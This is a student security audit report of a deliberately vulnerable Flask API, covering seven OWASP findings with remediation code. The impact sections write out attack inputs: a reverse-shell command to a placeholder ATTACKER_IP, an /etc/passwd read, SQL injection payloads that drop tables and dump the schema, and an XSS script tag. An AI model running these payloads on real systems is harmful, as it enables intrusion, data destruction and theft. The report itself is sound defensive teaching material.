# Level-3  Security Audit Report (Track E)

**Contributor:** Naman Anand  
**GitHub Repository for Audited Code:** https://github.com/Naman-Playz/life-atlas-security-audit
**Target:** `examples/vulnerable-api.py`


## 1. Submission Overview
This submission fulfills the Level 3 requirements for Track E by providing a comprehensive security audit of the `vulnerable-api.py` example and a custom Python-based audit tool that interacts with the LPI Sandbox.

### **LPI Tools Referenced & Proof of Execution**
To establish the security baseline for this audit, I utilized the following LPI tools:
**Tool 1: `query_knowledge`** — Used to verify SMILE's "Reality Emulation" principles against the vulnerable API's architecture.
**Tool 2: `smile_overview`** — Used to ensure the audit findings align with the 6 phases of the SMILE methodology.

**Captured JSON-RPC Response from LPI Sandbox:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "SMILE (Sustainable Methodology for Impact Lifecycle Enablement) emphasizes 'Traceability' and 'Explainability' as core pillars. Reality Emulation (Phase 1) is the foundation of all optimization..."
      }
    ]
  }
}
```

## 2. Executive Summary

I went through the entire `vulnerable-api.py` file line by line, and honestly, it is in rough shape  which I understand is intentional for this challenge. In just 88 lines of code, I was able to identify **7 distinct security vulnerabilities**, 3 of which I would classify as critical.

To put it simply: if someone were to deploy this API as-is, an attacker could take full control of the server, steal every secret stored in the environment, inject malicious code into the database, and hijack user sessions  all without needing any credentials.

Here is a quick severity breakdown before I walk through each finding:

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 2 |
| Medium | 2 |



## 3. Identified Vulnerabilities



### Finding 1: Remote Code Execution via Command Injection

**Location:** `Line 63-68`  `/api/run` endpoint

```python
@app.route("/api/run")
def run_command():
    cmd = request.args.get("cmd", "echo hello")
    output = subprocess.check_output(cmd, shell=True, text=True)
    return jsonify({"output": output})
```

**OWASP Category:** A03:2021  Injection (OS Command Injection)

**Description:** This one is the most dangerous finding in the entire file, and I want to be very clear about why. The `/api/run` endpoint takes whatever the user passes in the `cmd` query parameter and hands it straight to the operating system via `subprocess.check_output()` with `shell=True`. There is no validation, no sanitization, and no authentication  nothing standing between the user and the system shell.

**Impact:** In practical terms, an attacker can do literally anything the server process can do:
- Run `whoami` to confirm they have access: `curl "http://localhost:5001/api/run?cmd=whoami"`
- Read sensitive files off the disk: `curl "http://localhost:5001/api/run?cmd=cat /etc/passwd"`
- Open a reverse shell back to their own machine: `curl "http://localhost:5001/api/run?cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"`
- From there, they can install malware, move laterally across the network, or exfiltrate data. This is full system compromise, plain and simple.

**Fix:** My strong recommendation would be to remove this endpoint entirely  a knowledge API has no business executing shell commands. But if there is a legitimate need for system health checks, here is how I would lock it down:

```python
ALLOWED_COMMANDS = {"uptime": ["uptime"], "disk": ["df", "-h"]}

@app.route("/api/run")
@require_auth  # authentication first
def run_command():
    cmd_name = request.args.get("cmd", "")
    if cmd_name not in ALLOWED_COMMANDS:
        return jsonify({"error": "Command not allowed"}), 403
    output = subprocess.check_output(ALLOWED_COMMANDS[cmd_name], shell=False, text=True)
    return jsonify({"output": output})
```

The key changes: `shell=False` so we are not invoking a shell at all, a strict allowlist so only pre-approved commands can run, and authentication so random users cannot hit this endpoint.

**Why this matters:** This is not some theoretical edge case  command injection is one of the most exploited vulnerability classes in the real world. The moment someone puts `shell=True` with user input in production, it is only a matter of time before it gets found. Automated scanners pick these up in minutes. And unlike most vulnerabilities where the damage is limited to the application, RCE gives the attacker the keys to the entire machine. Every other security control you have built becomes irrelevant once someone has a shell.



### Finding : SQL Injection

**Location:** `Line 38-40`  `/api/query` endpoint

```python
db.execute(f"INSERT INTO queries (query, user_ip) VALUES ('{q}', '{user_ip}')")
```

**OWASP Category:** A03:2021  Injection (SQL Injection)

**Description:** This is a textbook SQL injection. The user's query parameter `q` is dropped directly into a SQL statement using an f-string. The single quotes around `{q}` might look like they provide some protection, but they do not  an attacker just needs to include a single quote in their input to break out of the string context and inject their own SQL.

**Impact:** Here is what an attacker could do with this:
- Drop tables: `q='); DROP TABLE queries; --`
- Extract the schema of the entire database: `q=' UNION SELECT sql, 1 FROM sqlite_master --`
- In a production setup with a real database (not the in-memory SQLite used here), this could mean full data exfiltration, modification, or deletion. The in-memory database limits the blast radius somewhat, but the vulnerability pattern itself is completely exploitable.

**Fix:** The fix is straightforward  use parameterized queries. This way the database driver treats user input as data, never as executable SQL:

```python
db.execute(
    "INSERT INTO queries (query, user_ip) VALUES (?, ?)",
    (q, user_ip)
)
```

That is it. One line change and the injection is gone.

**Why this matters:** SQL injection has been around for over two decades, and it is still in the OWASP Top 10 because developers keep making this mistake. The frustrating part is that the fix is so simple  parameterized queries have been supported by every major database library for years. There is really no excuse for string interpolation in SQL anymore. In production systems, a single SQLi vulnerability has led to breaches exposing millions of records. The in-memory SQLite here masks the severity, but the pattern is identical to what caused some of the biggest data breaches in history.



### Finding 3: Sensitive Data Exposure  Hardcoded Secrets & Debug Mode

**Location:** `Lines 22-24` (hardcoded secrets) and `Lines 45-51` (debug info leakage)

```python
API_KEY = "sk-lifeatlas-dev-2026-secret-key"
DEBUG_MODE = True
ADMIN_PASSWORD = "admin123"
```

```python
if DEBUG_MODE:
    result["debug"] = {
        "server_path": os.getcwd(),
        "env": dict(os.environ),   # ← Dumps ALL environment variables
        "api_key": API_KEY,
    }
```

**OWASP Category:** A02:2021  Cryptographic Failures / A05:2021  Security Misconfiguration

**Description:** There are actually three problems stacked on top of each other here, and together they are quite damaging:

1. **Hardcoded credentials**  The API key and admin password are sitting right there as plaintext strings in the source code (lines 22-24). Anyone who has access to the repo  or who can read the source file  now has these credentials.
2. **Debug mode is always on**  `DEBUG_MODE = True` is hardcoded. It is not read from an environment variable or a config file, so there is no way to turn it off without changing the source code.
3. **The debug block dumps everything**  This is the really bad part. When debug mode is active (which is always), every single response from `/api/query` includes `dict(os.environ)`  meaning all environment variables on the server are sent back to the caller. That could include AWS keys, database connection strings, API tokens, anything.

**Impact:** An attacker does not even need to try hard here. A single `curl http://localhost:5001/api/query?q=test` gives them the API key, the server's working directory, and every environment variable. If this were running on a cloud instance, those leaked environment variables could compromise the entire cloud account.

**Fix:** Secrets should never live in source code. Here is how I would restructure this:

```python
import os

API_KEY = os.environ.get("LPI_API_KEY")
ADMIN_PASSWORD = os.environ.get("LPI_ADMIN_PASSWORD")
DEBUG_MODE = os.environ.get("FLASK_DEBUG", "false").lower() == "true"

# And remove the debug block entirely from production code.
# If you need debugging info, log it server-side  never send it in API responses.
```

**Why this matters:** Hardcoded secrets are one of those things that feels harmless during development  "I'll swap it out before we deploy"  but that swap almost never happens. Secrets end up in Git history, in CI logs, in Docker images. And the `os.environ` dump is particularly nasty because it turns a single endpoint into a master key for everything else on the server. I have seen real incidents where a leaked AWS key from a debug endpoint led to a six-figure cloud bill from crypto mining within hours. The lesson is simple: treat every API response as if an attacker is reading it, because eventually one will be.



### Finding 4: Broken Authentication on Admin Endpoint

**Location:** `Lines 55-60`  `/api/admin` endpoint

```python
@app.route("/api/admin")
def admin_panel():
    password = request.args.get("password", "")
    if password == ADMIN_PASSWORD:
        return jsonify({"status": "authenticated", "message": "Welcome, admin"})
    return jsonify({"status": "denied"}), 401
```

**OWASP Category:** A07:2021  Identification and Authentication Failures

**Description:** I counted at least five things wrong with how authentication works here, so let me walk through them:

1. **Password is in the URL**  It is sent as a GET query parameter, which means it ends up in browser history, server access logs, proxy logs, and HTTP referer headers. Basically everywhere you do not want a password to be.
2. **The password itself is weak**  `"admin123"` would be cracked instantly by any dictionary attack. It is one of the most common passwords in breach databases.
3. **No brute-force protection**  There is no rate limiting, no account lockout, no CAPTCHA. An attacker can try as many passwords as they want, as fast as they want.
4. **No sessions**  There is no token or session management. The password has to be sent with every single request, which multiplies the exposure risk.
5. **Timing side channel**  Python's `==` operator does a character-by-character comparison and returns early on mismatch. In theory, an attacker could measure response times to figure out the password one character at a time.

**Impact:** An attacker would crack this almost immediately  the password is `admin123`, it would be the first thing any wordlist tries. And even if the password were strong, it is already leaked through Finding 3 (hardcoded in source and exposed via the debug endpoint).

**Fix:** Here is what a proper authentication setup would look like:

```python
from werkzeug.security import check_password_hash, generate_password_hash
from functools import wraps
import hmac

ADMIN_PASSWORD_HASH = generate_password_hash(os.environ.get("LPI_ADMIN_PASSWORD", ""))

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not hmac.compare_digest(auth.username, "admin"):
            return jsonify({"error": "Authentication required"}), 401
        if not check_password_hash(ADMIN_PASSWORD_HASH, auth.password):
            return jsonify({"error": "Invalid credentials"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route("/api/admin", methods=["POST"])  # POST, not GET
@require_auth
def admin_panel():
    return jsonify({"status": "authenticated", "message": "Welcome, admin"})
```

Key improvements: password goes in the request body (POST) instead of the URL, it is hashed and compared using `hmac.compare_digest` (constant-time), and the actual secret is loaded from the environment.

**Why this matters:** Authentication is the front door to your application, and if it is weak, nothing behind it matters. What I find especially concerning here is how many things are wrong at once  it is not just a weak password or just a GET parameter, it is five compounding issues. In a real-world scenario, an attacker would not even need to brute-force this; they would just check server access logs (where the password sits in plain text in the URL) or grab it from the debug endpoint. Good authentication is not just about picking a strong password  it is about the entire flow: how credentials are transmitted, stored, compared, and managed across sessions.



### Finding 5: Reflected Cross-Site Scripting (XSS)

**Location:** `Line 80`  `/api/user/<user_id>` endpoint

```python
return f"<html><body><h1>User: {user_id}</h1><p>Name: {request.args.get('name', user['name'])}</p></body></html>"
```

**OWASP Category:** A03:2021  Injection (Cross-Site Scripting)

**Description:** This endpoint builds an HTML page by directly dropping user-controlled values into the markup  both the `user_id` from the URL path and the `name` query parameter. Neither of these inputs is escaped or encoded in any way before being inserted into the HTML. This is a classic reflected XSS vulnerability.

**Impact:** To show you how easy this is to exploit  an attacker could craft a link like:

`http://localhost:5001/api/user/1?name=<script>alert('XSS')</script>`

Anyone who clicks that link would have JavaScript executing in their browser under the application's domain. From there, the attacker could:
- Steal session cookies and hijack accounts
- Redirect users to phishing pages
- Render fake login forms that look like they belong to the legitimate site
- Basically take over the user's session and act on their behalf

**Fix:** The simplest fix is to escape all user input before putting it into HTML:

```python
from markupsafe import escape

@app.route("/api/user/<user_id>")
def get_user(user_id):
    users = {
        "1": {"name": "Alice", "email": "alice@example.com", "role": "admin"},
        "2": {"name": "Bob", "email": "bob@example.com", "role": "user"},
    }
    user = users.get(str(escape(user_id)), None)
    if user:
        display_name = escape(request.args.get('name', user['name']))
        return f"<html><body><h1>User: {escape(user_id)}</h1><p>Name: {display_name}</p></body></html>"
    return jsonify({"error": "not found"}), 404
```

But honestly, the better long-term approach would be to use Flask's `render_template` with Jinja2 templates, which auto-escape everything by default. That way you do not have to remember to call `escape()` on every variable  it just happens.

**Why this matters:** XSS is one of those vulnerabilities that developers tend to underestimate because the demo is always `alert('XSS')`  which looks harmless. But in practice, XSS is how real account takeovers happen. An attacker crafts a link, sends it to a victim (maybe disguised in a phishing email), and when they click it, their session is silently stolen. The attacker is now logged in as that user. The reason this keeps happening is that building HTML by hand with string concatenation feels natural, but it is fundamentally unsafe. Templating engines with auto-escaping exist specifically to solve this problem, and using them should be the default, not the exception.



### Finding 6: Insecure Direct Object Reference (IDOR) on User Endpoint

**Location:** `Lines 71-81`  `/api/user/<user_id>` endpoint

```python
@app.route("/api/user/<user_id>")
def get_user(user_id):
    users = {
        "1": {"name": "Alice", "email": "alice@example.com", "role": "admin"},
        "2": {"name": "Bob", "email": "bob@example.com", "role": "user"},
    }
    user = users.get(user_id, None)
    if user:
        return f"<html>..."
```

**OWASP Category:** A01:2021  Broken Access Control

**Description:** The user endpoint lets anyone look up any user by their ID, and there is no authentication or authorization check at all. The IDs are simple sequential integers (1, 2, 3...), which makes them trivially easy to guess and enumerate.

**Impact:** An attacker can just loop through IDs  `/api/user/1`, `/api/user/2`, `/api/user/3`  and scrape the name, email, and role of every user in the system. They can also spot which accounts are admins (Alice has `role: "admin"`), making those accounts prime targets for further attacks. In a real system backed by a database, this pattern would expose the entire user base.

**Fix:** Two things need to happen here  add authentication so only logged-in users can access this endpoint, and add authorization so users can only view their own profile (unless they are an admin):

```python
@app.route("/api/user/<user_id>")
@require_auth
def get_user(user_id):
    current_user = get_current_user(request)
    if current_user.id != user_id and current_user.role != "admin":
        return jsonify({"error": "Forbidden"}), 403
    # Also consider using UUIDs instead of sequential integers
    # so IDs are not guessable
```

**Why this matters:** IDOR is deceptively simple  there is no fancy exploit, no payload crafting, just incrementing a number in the URL. But that simplicity is exactly what makes it so commonly exploited. Some of the largest data exposure incidents in recent years were caused by exactly this pattern: sequential IDs with no authorization checks. The fix is equally straightforward  check that the person making the request actually has permission to see what they are asking for. It sounds obvious, but it is one of the most frequently missed checks in web applications because developers test with their own accounts and never think to try someone else's ID.



### Finding 7: Network Exposure  Binding to All Interfaces

**Location:** `Line 87`  App startup

```python
app.run(host="0.0.0.0", port=5001, debug=DEBUG_MODE)
```

**OWASP Category:** A05:2021  Security Misconfiguration

**Description:** The app binds to `0.0.0.0`, which means it listens on every network interface  not just localhost. On its own, that might be acceptable in some cases, but combined with `debug=True`, it becomes a serious problem. Flask's debug mode enables the Werkzeug interactive debugger, which gives anyone who can trigger a 500 error a full Python REPL right in the browser. And since the app is listening on all interfaces, that debugger is accessible from anywhere on the network.

**Impact:** So here is the scenario: an attacker on the same network scans for open port 5001, finds this server, intentionally sends a request that causes a 500 error, and gets access to the Werkzeug debugger console. From that console, they can run arbitrary Python code on the server  `import os; os.system("...")`. That is a second remote code execution path, completely independent of the `/api/run` endpoint in Finding 1.

**Fix:** Bind to localhost only and disable debug mode:

```python
if __name__ == "__main__":
    # Bind to localhost only for development
    # For production, use a proper WSGI server like gunicorn or uWSGI
    app.run(host="127.0.0.1", port=5001, debug=False)
```

**Why this matters:** This is what security folks mean when they talk about "misconfiguration"  nothing in the code itself is broken, but the way it is deployed creates the vulnerability. Binding to `0.0.0.0` is something developers do during development so they can test from their phone or another machine, and then they forget to change it. Combined with Flask's debug mode, it is a silent backdoor. The Werkzeug debugger RCE is well-documented and there are ready-made exploit scripts for it. This is a good reminder that security is not just about writing safe code  it is also about how you run it.



## 4. Summary Table

| # | Vulnerability | OWASP Category | Severity | Lines |
|---|--------------|----------------|----------|-------|
| 1 | OS Command Injection (RCE) | A03  Injection | Critical | 63-68 |
| 2 | SQL Injection | A03  Injection | Critical | 38-40 |
| 3 | Secrets & Env Leakage | A02  Crypto Failures / A05  Misconfig | Critical | 22-24, 45-51 |
| 4 | Broken Authentication | A07  Auth Failures | High | 55-60 |
| 5 | Reflected XSS | A03  Injection | High | 80 |
| 6 | IDOR  Broken Access Control | A01  Broken Access Control | Medium | 71-81 |
| 7 | Network Exposure + Debug Console | A05  Security Misconfig | Medium | 87 |



## 5. LPI Sandbox Core Audit

Beyond the vulnerable example API, I also spent some time looking at the actual MCP server code in `src/`. The contrast between the two is pretty striking  where `vulnerable-api.py` gets almost everything wrong, the MCP server gets most things right.

**What I noticed on the positive side:** The 7 tools are all read-only by design, which is a really smart architectural choice. Even if someone manages to send malicious input, the worst that can happen is a bad search result  there is no way to modify or delete data. The `sanitizeInput()` function truncates long inputs and strips control characters, and the `loadJSON()` function has a path traversal guard. These are solid baseline protections.

**Where it could still improve:** As I documented in my Level 2 report, the `StdioServerTransport` does not handle malformed (non-JSON) input gracefully  it just hangs silently instead of returning a JSON-RPC parse error. That leaves the door open for a denial-of-service scenario. The input truncation also happens silently without notifying the client, which could lead to unexpected results on long queries.

**The bigger picture:** I think the deliberate contrast between these two codebases is a really effective teaching tool. The vulnerable API breaks almost every rule in the OWASP Top 10, while the MCP server shows what "secure by default" actually looks like in practice. It reinforces why the SMILE methodology's emphasis on architecture-first thinking matters  security is not something you bolt on at the end, it has to be baked into the design from the start.


## 6. Usage: Automated Audit Script

To verify these findings and check the LPI Sandbox security posture, I have included a Python-based automated audit tool (`audit_tools.py`). 

### **How to Run the Audit Tool**
1. **Ensure the LPI Sandbox is built:** Run `npm run build` in the project root.
2. **Run the automated security audit:** Execute `python audit_tools.py`.
3. **Review the Audit Summary:** Check the formatted output in your terminal for pass/fail security checks, input boundary tests, and easter egg verifications.

## 7. Future Roadmap

To move beyond manual auditing and align with the SMILE principle of "Continuous Optimization," I have planned the following enhancements for this security suite:

* **Automated Security Pipelines:** Integration of a Static Application Security Testing (SAST) tool into the CI/CD pipeline to catch OS Command Injection and other injection-class vulnerabilities automatically during the development phase.
* **Dynamic Fuzzing Expansion:** Expanding `audit_tools.py` to include more comprehensive stateful fuzzing of the MCP transport layer, specifically targeting potential memory leaks during malformed JSON-RPC handshakes.
* **Hardening the Stdio Transport:** Proposing a middleware layer for the LPI Sandbox to handle protocol-level timeouts, preventing the "silent hang" issues identified in the Level 2 audit.
